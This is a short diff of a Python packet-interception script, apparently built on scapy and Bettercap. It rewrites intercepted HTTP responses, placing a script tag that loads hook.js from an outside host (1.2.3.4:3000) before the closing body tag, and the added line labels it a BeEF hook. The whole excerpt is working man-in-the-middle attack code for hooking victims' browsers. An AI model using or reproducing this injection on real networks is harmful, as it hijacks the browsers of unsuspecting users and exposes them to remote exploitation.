@@ -22,6 +22,7 @@ def process_packet(packet):
             elif scapy_packet[scapy.TCP].sport == 8080: # Bettercap = 8080, otherwise 80
                 print("[+] Response")
                 injection_code = b'<script src="http://1.2.3.4:3000/hook.js"></script>'
+                # This is a hook for BeEF
                 # change IP to Kali IP
                 load = load.replace(b"</body>", injection_code + b"</body>")
                 content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
